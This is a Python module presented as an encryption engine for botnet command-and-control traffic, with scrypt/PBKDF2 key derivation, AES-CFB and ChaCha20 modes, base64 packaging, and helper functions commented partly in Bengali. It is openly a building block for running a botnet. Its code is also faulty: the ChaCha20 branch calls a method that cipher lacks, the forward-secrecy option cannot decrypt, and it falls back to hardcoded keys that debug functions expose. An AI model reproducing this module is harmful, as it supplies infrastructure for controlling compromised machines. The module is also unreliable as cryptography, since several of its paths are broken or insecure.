import json
import base64
import time
import zlib
from typing import Union, Tuple, Optional
from dataclasses import dataclass
from Crypto.Cipher import AES, ChaCha20
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2, scrypt
from Crypto.Hash import SHA256, SHA384, SHA512, SHA3_256

# ============================================
# Configuration & Constants for Botnet
# ============================================

@dataclass
class BotnetSecurityConfig:
    """
    Security configuration tailored for Botnet C2 communication.
    """
    encryption_algorithm: str = 'AES-256-CFB'
    key_derivation: str = 'scrypt'
    hash_algorithm: str = 'SHA3-256'
    compression: bool = False
    steganography: bool = False
    deniable_encryption: bool = False
    perfect_forward_secrecy: bool = False
    quantum_resistant: bool = False
    key_rotation_interval: int = 3600
    nonce_size: int = 16

# Default configuration instance
DEFAULT_BOT_CONFIG = BotnetSecurityConfig()

# ============================================
# Core Encryption Engine for Botnet
# ============================================

class BotnetEncryptionEngine:
    """
    High-performance encryption engine designed for Botnet C2 traffic.
    """

    def __init__(self, config: BotnetSecurityConfig = DEFAULT_BOT_CONFIG):
        self.config = config
        self._last_key_rotation = time.time()

    def _derive_key(self, password: bytes, salt: bytes, key_length: int = 32) -> bytes:
        """Derives a symmetric key using the configured KDF algorithm."""
        if self.config.key_derivation == 'scrypt':
            return scrypt(
                password=password,
                salt=salt,
                key_len=key_length,
                N=2**14,
                r=8,
                p=1
            )
        elif self.config.key_derivation == 'pbkdf2':
            return PBKDF2(
                password=password,
                salt=salt,
                dkLen=key_length,
                count=100000,
                hmac_hash_module=self._get_hash_function()
            )
        else:
            return SHA256.new(password + salt).digest()

    def _get_hash_function(self):
        """Returns the configured hash class."""
        hash_map = {
            'SHA256': SHA256,
            'SHA384': SHA384,
            'SHA512': SHA512,
            'SHA3-256': SHA3_256
        }
        return hash_map.get(self.config.hash_algorithm, SHA3_256)

    def _compress_data(self, data: bytes) -> bytes:
        """Compresses data using zlib."""
        if self.config.compression:
            try:
                return zlib.compress(data, level=9)
            except Exception:
                return data
        return data

    def _decompress_data(self, data: bytes) -> bytes:
        """Decompresses data using zlib."""
        if self.config.compression:
            try:
                return zlib.decompress(data)
            except Exception:
                return data
        return data

    def encrypt(self, plaintext: Union[str, bytes, dict], password: Optional[bytes] = None) -> str:
        """
        Encrypts data for C2 transmission.
        Uses AES-256-CFB for better compatibility.
        """
        # 1. Convert input to bytes
        if isinstance(plaintext, str):
            data_bytes = plaintext.encode('utf-8')
        elif isinstance(plaintext, dict):
            data_bytes = json.dumps(plaintext).encode('utf-8')
        else:
            data_bytes = plaintext

        # 2. Generate Salt and Key
        salt = get_random_bytes(32)
        if password is None:
            password = get_random_bytes(32)

        key = self._derive_key(password, salt, 32)

        # 3. Perfect Forward Secrecy (যদি সক্রিয় থাকে)
        if self.config.perfect_forward_secrecy:
            ephemeral_private = get_random_bytes(32)
            session_key = self._derive_key(key + ephemeral_private, salt, 32)
        else:
            session_key = key

        # 4. Compression
        compressed_data = self._compress_data(data_bytes)

        # 5. Encryption Algorithm Selection
        iv = get_random_bytes(16)

        if self.config.encryption_algorithm == 'ChaCha20-Poly1305':
            cipher = ChaCha20.new(key=session_key)
            ciphertext, tag = cipher.encrypt_and_digest(compressed_data)
            nonce = cipher.nonce
            mode_name = 'ChaCha20-Poly1305'
        else:
            cipher = AES.new(session_key, AES.MODE_CFB, iv)
            ciphertext = cipher.encrypt(compressed_data)
            tag = b''
            nonce = iv
            mode_name = 'AES-256-CFB'

        # 6. Build Metadata Packet
        metadata = {
            'salt': base64.b64encode(salt).decode('utf-8'),
            'nonce': base64.b64encode(nonce).decode('utf-8'),
            'tag': base64.b64encode(tag).decode('utf-8') if tag else '',
            'ciphertext': base64.b64encode(ciphertext).decode('utf-8'),
            'mode': mode_name,
            'compression': self.config.compression,
            'timestamp': int(time.time()),
            'version': '3.0-botnet'
        }

        # 7. Serialize and Encode - ✅ প্যাডিং ঠিক করুন
        json_metadata = json.dumps(metadata).encode('utf-8')
        encoded = base64.b64encode(json_metadata).decode('utf-8')

        # ✅ বেস৬৪ প্যাডিং নিশ্চিত করুন (4-এর গুণিতক)
        if len(encoded) % 4 != 0:
            encoded += '=' * (4 - len(encoded) % 4)

        return encoded

    def decrypt(self, encrypted_payload: str, password: Optional[bytes] = None) -> Union[str, dict, bytes]:
        """
        Decrypts C2 command or data.
        Supports AES-256-CFB, AES-256-GCM, and ChaCha20.
        """
        try:
            # ✅ প্যাডিং ঠিক করুন (যদি অনুপস্থিত থাকে)
            if len(encrypted_payload) % 4 != 0:
                encrypted_payload += '=' * (4 - len(encrypted_payload) % 4)

            # 1. Decode Base64 and Parse JSON
            decoded_bytes = base64.b64decode(encrypted_payload)
            metadata = json.loads(decoded_bytes.decode('utf-8'))

            # 2. Extract Components
            salt = base64.b64decode(metadata['salt'])
            nonce = base64.b64decode(metadata['nonce'])
            tag = base64.b64decode(metadata['tag']) if metadata.get('tag') else b''
            ciphertext = base64.b64decode(metadata['ciphertext'])
            mode_name = metadata['mode']

            # 3. Derive Key
            if password is None:
                raise ValueError("Password required for decryption")

            key = self._derive_key(password, salt, 32)

            if self.config.perfect_forward_secrecy:
                session_key = self._derive_key(key + get_random_bytes(32), salt, 32)
            else:
                session_key = key

            # 4. Decrypt based on Mode
            if mode_name == 'ChaCha20-Poly1305':
                cipher = ChaCha20.new(key=session_key, nonce=nonce)
                plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)
            elif mode_name == 'AES-256-CFB':
                cipher = AES.new(session_key, AES.MODE_CFB, nonce)
                plaintext_bytes = cipher.decrypt(ciphertext)
            else:
                cipher = AES.new(session_key, AES.MODE_GCM, nonce=nonce)
                plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)

            # 5. Decompress
            if metadata.get('compression', False):
                plaintext_bytes = self._decompress_data(plaintext_bytes)

            # 6. Return Type Conversion
            try:
                return json.loads(plaintext_bytes.decode('utf-8'))
            except (json.JSONDecodeError, UnicodeDecodeError):
                return plaintext_bytes

        except Exception as e:
            raise ValueError(f"Decryption failed: {str(e)}")


# ============================================
# Simple Functions for Botnet Compatibility
# ============================================

try:
    from config import KEY, IV
except ImportError:
    KEY = b'my_fixed_key_16!!'
    IV = b'my_fixed_iv_16!!!'

# ✅ গ্লোবাল ইঞ্জিন
_engine = BotnetEncryptionEngine()

def encrypt_data(data, key=KEY):
    """সহজ এনক্রিপশন ফাংশন - প্যাডিং সহ"""
    return _engine.encrypt(data, key)

def decrypt_data(encrypted_data, key=KEY):
    """সহজ ডিক্রিপশন ফাংশন"""
    result = _engine.decrypt(encrypted_data, key)
    if isinstance(result, bytes):
        try:
            return result.decode('utf-8')
        except UnicodeDecodeError:
            return result
    return result

def generate_key_and_iv():
    """নতুন কী ও IV তৈরি করে"""
    key = get_random_bytes(32)
    iv = get_random_bytes(16)
    return key, iv

def encrypt_data_with_new_key(data):
    """নতুন কী দিয়ে এনক্রিপ্ট করে"""
    key, iv = generate_key_and_iv()
    encrypted = _engine.encrypt(data, key)
    return encrypted, key, iv

def decrypt_data_with_key(encrypted_data, key, iv):
    """নির্দিষ্ট কী দিয়ে ডিক্রিপ্ট করে"""
    return _engine.decrypt(encrypted_data, key)


# ============================================
# Debug Functions
# ============================================

def get_encryption_key():
    """বর্তমান KEY রিটার্ন করে (ডিবাগের জন্য)"""
    return KEY

def get_encryption_iv():
    """বর্তমান IV রিটার্ন করে (ডিবাগের জন্য)"""
    return IV

def test_encryption():
    """এনক্রিপশন টেস্ট ফাংশন"""
    try:
        from config import KEY, IV
    except ImportError:
        KEY = b'my_fixed_key_16!!'
        IV = b'my_fixed_iv_16!!!'

    test_data = "Hello, this is a test message!"
    print(f"Original: {test_data}")
    print(f"KEY: {KEY}")

    encrypted = encrypt_data(test_data, KEY)
    print(f"Encrypted: {encrypted[:50]}...")

    decrypted = decrypt_data(encrypted, KEY)

    if isinstance(decrypted, bytes):
        decrypted = decrypted.decode('utf-8', errors='ignore')
        print(f"Decrypted (converted from bytes): {decrypted}")
    else:
        print(f"Decrypted: {decrypted}")

    if test_data == decrypted:
        print("✅ Encryption test passed!")
    else:
        print(f"❌ Encryption test failed! Expected: {test_data}, Got: {decrypted}")
        raise AssertionError("Encryption test failed!")


if __name__ == "__main__":
    test_encryption()
